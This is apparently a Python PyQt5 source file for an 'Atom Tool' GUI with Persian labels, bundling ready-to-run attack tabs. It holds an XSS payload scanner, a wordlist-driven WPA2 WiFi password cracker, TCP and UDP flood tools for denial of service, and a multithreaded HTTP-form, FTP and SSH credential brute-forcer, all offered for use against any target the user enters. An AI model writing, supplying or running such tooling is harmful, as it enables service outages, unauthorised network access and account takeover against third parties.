import sys
import threading
import time
import requests
import socket
import queue
import random
from PyQt5.QtWidgets import (
    QApplication, QWidget, QTabWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QLineEdit, QPushButton, QTextEdit, QComboBox, QSpinBox, QFileDialog, QMessageBox
)

# ===================== XSS Scanner =====================
class XSSScannerTab(QWidget):
    def __init__(self):
        super().__init__()
        layout = QVBoxLayout()

        layout.addWidget(QLabel("آدرس هدف (بدون پارامتر):"))
        self.url_entry = QLineEdit()
        layout.addWidget(self.url_entry)

        layout.addWidget(QLabel("نام پارامتر آسیب‌پذیر:"))
        self.param_entry = QLineEdit()
        layout.addWidget(self.param_entry)

        self.start_btn = QPushButton("شروع اسکن XSS")
        self.start_btn.clicked.connect(self.start_scan)
        layout.addWidget(self.start_btn)

        self.results_box = QTextEdit()
        self.results_box.setReadOnly(True)
        layout.addWidget(self.results_box)

        self.setLayout(layout)
        self.payloads = [
            "<script>alert(1)</script>",
            "'\"><script>alert(2)</script>",
            "<img src=x onerror=alert(3)>"
        ]

    def start_scan(self):
        threading.Thread(target=self.xss_scan).start()

    def xss_scan(self):
        target = self.url_entry.text().strip()
        param = self.param_entry.text().strip()
        if not target or not param:
            QMessageBox.warning(self, "خطا", "لطفاً آدرس و پارامتر را وارد کنید.")
            return
        self.results_box.append(f"شروع اسکن XSS روی {target}\n")
        results = []
        for payload in self.payloads:
            try:
                params = {param: payload}
                r = requests.get(target, params=params, timeout=5)
                if payload in r.text:
                    msg = f"[+] آسیب‌پذیری احتمالی با پیلود: {payload}\nلینک تست: {r.url}\n"
                    self.results_box.append(msg)
                    results.append(msg)
                else:
                    self.results_box.append(f"[-] پیلود {payload} نتیجه نداد.\n")
            except Exception as e:
                self.results_box.append(f"[!] خطا: {e}\n")
        self.results_box.append("✅ اسکن تمام شد.\n")

# ===================== WiFi Brute Force =====================
try:
    import pywifi
    from pywifi import const
except ImportError:
    pywifi = None  # اگر نصب نباشه، تب غیر فعال میشه

class WiFiBruteForceTab(QWidget):
    def __init__(self):
        super().__init__()
        layout = QVBoxLayout()

        self.status_label = QLabel("آماده برای شروع تست.")
        layout.addWidget(self.status_label)

        self.ssid_combo = QComboBox()
        layout.addWidget(QLabel("انتخاب شبکه (SSID):"))
        layout.addWidget(self.ssid_combo)

        self.scan_btn = QPushButton("اسکن شبکه‌ها")
        self.scan_btn.clicked.connect(self.scan_networks)
        layout.addWidget(self.scan_btn)

        self.wordlist_entry = QLineEdit()
        layout.addWidget(QLabel("مسیر فایل پسورد:"))
        layout.addWidget(self.wordlist_entry)

        self.browse_btn = QPushButton("انتخاب فایل")
        self.browse_btn.clicked.connect(self.browse_wordlist)
        layout.addWidget(self.browse_btn)

        self.start_btn = QPushButton("شروع تست")
        self.start_btn.clicked.connect(self.run_threaded)
        layout.addWidget(self.start_btn)

        self.setLayout(layout)
        if pywifi:
            wifi = pywifi.PyWiFi()
            self.iface = wifi.interfaces()[0]
        else:
            self.iface = None
            self.scan_btn.setEnabled(False)
            self.start_btn.setEnabled(False)
            self.status_label.setText("pywifi نصب نشده، این تب غیرفعال است.")

    def scan_networks(self):
        if not self.iface:
            return
        self.iface.scan()
        time.sleep(3)
        results = self.iface.scan_results()
        ssid_list = list(set([net.ssid for net in results if net.ssid]))
        self.ssid_combo.clear()
        self.ssid_combo.addItems(ssid_list)
        if ssid_list:
            self.ssid_combo.setCurrentIndex(0)
        else:
            QMessageBox.warning(self, "هشدار", "هیچ شبکه‌ای یافت نشد!")

    def browse_wordlist(self):
        path, _ = QFileDialog.getOpenFileName(self, "انتخاب فایل پسورد", "", "Text Files (*.txt)")
        if path:
            self.wordlist_entry.setText(path)

    def run_threaded(self):
        threading.Thread(target=self.start_bruteforce).start()

    def start_bruteforce(self):
        ssid = self.ssid_combo.currentText()
        wordlist_path = self.wordlist_entry.text()
        if not ssid or not wordlist_path:
            QMessageBox.warning(self, "خطا", "SSID و مسیر فایل پسورد را وارد کنید.")
            return
        try:
            with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    password = line.strip()
                    self.status_label.setText(f"در حال تست: {password}")
                    QApplication.processEvents()
                    if self.connect_to_wifi(ssid, password):
                        QMessageBox.information(self, "یافت شد!", f"رمز یافت شد: {password}")
                        self.status_label.setText(f"رمز یافت شد: {password}")
                        return
            QMessageBox.information(self, "پایان", "رمز یافت نشد.")
            self.status_label.setText("تست به پایان رسید.")
        except Exception as e:
            QMessageBox.critical(self, "خطا", str(e))

    def connect_to_wifi(self, ssid, password):
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        self.iface.remove_all_network_profiles()
        tmp_profile = self.iface.add_network_profile(profile)
        self.iface.connect(tmp_profile)
        time.sleep(3)
        if self.iface.status() == const.IFACE_CONNECTED:
            self.iface.disconnect()
            return True
        return False

# ===================== TCP Flood =====================
class TCPFloodTab(QWidget):
    def __init__(self):
        super().__init__()
        layout = QVBoxLayout()

        layout.addWidget(QLabel("آدرس هدف (IP یا دامنه):"))
        self.host_input = QLineEdit()
        layout.addWidget(self.host_input)

        layout.addWidget(QLabel("پورت هدف:"))
        self.port_input = QLineEdit()
        layout.addWidget(self.port_input)

        self.status_label = QLabel("وضعیت: آماده")
        layout.addWidget(self.status_label)

        self.start_btn = QPushButton("شروع حمله TCP Flood")
        self.start_btn.clicked.connect(self.start_attack)
        layout.addWidget(self.start_btn)

        self.stop_btn = QPushButton("توقف حمله")
        self.stop_btn.clicked.connect(self.stop_attack)
        self.stop_btn.setEnabled(False)
        layout.addWidget(self.stop_btn)

        self.log_area = QTextEdit()
        self.log_area.setReadOnly(True)
        layout.addWidget(self.log_area)

        self.setLayout(layout)
        self.running = False
        self.thread = None

    def tcp_flood(self, host, port):
        try:
            ip = socket.gethostbyname(host)
        except:
            self.show_error("نام دامنه یا IP معتبر نیست.")
            self.running = False
            self.update_buttons()
            return
        self.log_area.append(f"شروع حمله TCP Flood به {ip}:{port}")
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((ip, port))
                sock.send(b"GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(ip).encode())
                sock.close()
                self.log_area.append(f"اتصال ارسال شد به {ip}:{port}")
                QApplication.processEvents()
            except Exception as e:
                self.log_area.append(f"خطا در اتصال: {e}")
                time.sleep(0.01)
        self.log_area.append("حمله متوقف شد.")
        self.status_label.setText("وضعیت: متوقف شده")
        self.update_buttons()

    def start_attack(self):
        if self.running:
            QMessageBox.warning(self, "هشدار", "حمله در حال اجرا است.")
            return
        host = self.host_input.text().strip()
        try:
            port = int(self.port_input.text())
            assert 1 <= port <= 65535
        except:
            self.show_error("پورت معتبر نیست.")
            return
        if not host:
            self.show_error("آدرس هدف را وارد کنید.")
            return
        self.running = True
        self.update_buttons()
        self.status_label.setText("در حال حمله TCP Flood")
        self.log_area.clear()
        self.thread = threading.Thread(target=self.tcp_flood, args=(host, port), daemon=True)
        self.thread.start()

    def stop_attack(self):
        self.running = False
        self.status_label.setText("در حال توقف...")
        self.update_buttons()

    def update_buttons(self):
        self.start_btn.setEnabled(not self.running)
        self.stop_btn.setEnabled(self.running)

    def show_error(self, msg):
        QMessageBox.critical(self, "خطا", msg)

# ===================== UDP Flood =====================
class UDPFloodTab(QWidget):
    def __init__(self):
        super().__init__()
        layout = QVBoxLayout()

        layout.addWidget(QLabel("آدرس هدف (IP یا دامنه):"))
        self.host_input = QLineEdit()
        layout.addWidget(self.host_input)

        layout.addWidget(QLabel("پورت هدف:"))
        self.port_input = QLineEdit()
        layout.addWidget(self.port_input)

        self.status_label = QLabel("وضعیت: آماده")
        layout.addWidget(self.status_label)

        self.start_btn = QPushButton("شروع حمله UDP Flood")
        self.start_btn.clicked.connect(self.start_attack)
        layout.addWidget(self.start_btn)

        self.stop_btn = QPushButton("توقف حمله")
        self.stop_btn.clicked.connect(self.stop_attack)
        self.stop_btn.setEnabled(False)
        layout.addWidget(self.stop_btn)

        self.log_area = QTextEdit()
        self.log_area.setReadOnly(True)
        layout.addWidget(self.log_area)

        self.setLayout(layout)
        self.running = False
        self.thread = None

    def udp_flood(self, host, port):
        try:
            ip = socket.gethostbyname(host)
        except:
            self.show_error("نام دامنه یا IP معتبر نیست.")
            self.running = False
            self.update_buttons()
            return
        self.log_area.append(f"شروع حمله UDP Flood به {ip}:{port}")
        bs = random._urandom(1490)
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(bs, (ip, port))
                self.log_area.append(f"پکت UDP ارسال شد به {ip}:{port}")
                QApplication.processEvents()
            except Exception as e:
                self.log_area.append(f"خطا: {e}")
                time.sleep(0.01)
        self.log_area.append("حمله متوقف شد.")
        self.status_label.setText("وضعیت: متوقف شده")
        self.update_buttons()

    def start_attack(self):
        if self.running:
            QMessageBox.warning(self, "هشدار", "حمله در حال اجرا است.")
            return
        host = self.host_input.text().strip()
        try:
            port = int(self.port_input.text())
            assert 1 <= port <= 65535
        except:
            self.show_error("پورت معتبر نیست.")
            return
        if not host:
            self.show_error("آدرس هدف را وارد کنید.")
            return
        self.running = True
        self.update_buttons()
        self.status_label.setText("در حال حمله UDP Flood")
        self.log_area.clear()
        self.thread = threading.Thread(target=self.udp_flood, args=(host, port), daemon=True)
        self.thread.start()

    def stop_attack(self):
        self.running = False
        self.status_label.setText("در حال توقف...")
        self.update_buttons()

    def update_buttons(self):
        self.start_btn.setEnabled(not self.running)
        self.stop_btn.setEnabled(self.running)

    def show_error(self, msg):
        QMessageBox.critical(self, "خطا", msg)

# ===================== Hydra-like Brute Force =====================
import ftplib
try:
    import paramiko
except ImportError:
    paramiko = None

class HydraTab(QWidget):
    def __init__(self):
        super().__init__()
        layout = QVBoxLayout()

        layout.addWidget(QLabel("Protocol:"))
        self.proto_combo = QComboBox()
        self.proto_combo.addItems(["HTTP-Form", "FTP", "SSH"])
        layout.addWidget(self.proto_combo)

        layout.addWidget(QLabel("Target (URL or IP):"))
        self.target_input = QLineEdit("http://127.0.0.1:5000/login")
        layout.addWidget(self.target_input)

        self.user_btn = QPushButton("Select User List")
        self.user_btn.clicked.connect(self.load_users)
        layout.addWidget(self.user_btn)

        self.pass_btn = QPushButton("Select Password List")
        self.pass_btn.clicked.connect(self.load_passwords)
        layout.addWidget(self.pass_btn)

        layout.addWidget(QLabel("Threads:"))
        self.thread_spin = QSpinBox()
        self.thread_spin.setValue(5)
        self.thread_spin.setRange(1, 50)
        layout.addWidget(self.thread_spin)

        self.start_btn = QPushButton("Start Brute Force")
        self.start_btn.clicked.connect(self.start_attack)
        layout.addWidget(self.start_btn)

        self.log = QTextEdit()
        self.log.setReadOnly(True)
        layout.addWidget(self.log)

        self.setLayout(layout)
        self.users = []
        self.passwords = []
        self.task_queue = queue.Queue()
        self.found = False

    def load_users(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select User List", "", "Text Files (*.txt)")
        if path:
            with open(path, "r") as f:
                self.users = [u.strip() for u in f if u.strip()]
            QMessageBox.information(self, "Loaded", f"Loaded {len(self.users)} users")

    def load_passwords(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select Password List", "", "Text Files (*.txt)")
        if path:
            with open(path, "r") as f:
                self.passwords = [p.strip() for p in f if p.strip()]
            QMessageBox.information(self, "Loaded", f"Loaded {len(self.passwords)} passwords")

    def start_attack(self):
        if not self.users or not self.passwords:
            QMessageBox.warning(self, "Error", "Please load user and password lists first.")
            return

        self.target = self.target_input.text().strip()
        self.proto = self.proto_combo.currentText()
        threads = self.thread_spin.value()

        self.task_queue = queue.Queue()
        for user in self.users:
            for pwd in self.passwords:
                self.task_queue.put((user, pwd))

        self.found = False
        self.log.append(f"[*] Starting brute force on {self.target} ({self.proto}) with {threads} threads...")

        for _ in range(threads):
            t = threading.Thread(target=self.worker)
            t.start()

    def worker(self):
        while not self.task_queue.empty() and not self.found:
            try:
                user, pwd = self.task_queue.get_nowait()
            except queue.Empty:
                return
            try:
                if self.proto == "HTTP-Form":
                    data = {"username": user, "password": pwd}
                    r = requests.post(self.target, data=data, timeout=5)
                    if "successful" in r.text.lower():
                        self.log.append(f"[+] Found → {user}:{pwd}")
                        self.found = True
                        return
                    else:
                        self.log.append(f"[-] Tried → {user}:{pwd}")
                elif self.proto == "FTP":
                    host = self.target.replace("ftp://", "")
                    try:
                        ftp = ftplib.FTP(host, timeout=5)
                        ftp.login(user, pwd)
                        self.log.append(f"[+] Found → {user}:{pwd}")
                        self.found = True
                        ftp.quit()
                        return
                    except:
                        self.log.append(f"[-] Tried → {user}:{pwd}")
                elif self.proto == "SSH" and paramiko:
                    host = self.target.replace("ssh://", "")
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    try:
                        ssh.connect(host, username=user, password=pwd, timeout=5)
                        self.log.append(f"[+] Found → {user}:{pwd}")
                        self.found = True
                        ssh.close()
                        return
                    except:
                        self.log.append(f"[-] Tried → {user}:{pwd}")
            except Exception as e:
                self.log.append(f"[!] Error {user}:{pwd} → {e}")

# ===================== Main Atom Window =====================
class AtomApp(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Atom Tool - همه ابزارها")
        self.resize(500, 500)

        layout = QVBoxLayout()
        self.tabs = QTabWidget()
        layout.addWidget(self.tabs)

        # Add tabs
        self.tabs.addTab(XSSScannerTab(), "XSS Scanner")
        self.tabs.addTab(WiFiBruteForceTab(), "WiFi Brute Force")
        self.tabs.addTab(TCPFloodTab(), "TCP Flood")
        self.tabs.addTab(UDPFloodTab(), "UDP Flood")
        self.tabs.addTab(HydraTab(), "Hydra Brute Force")

        self.setLayout(layout)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = AtomApp()
    window.show()
    sys.exit(app.exec_())
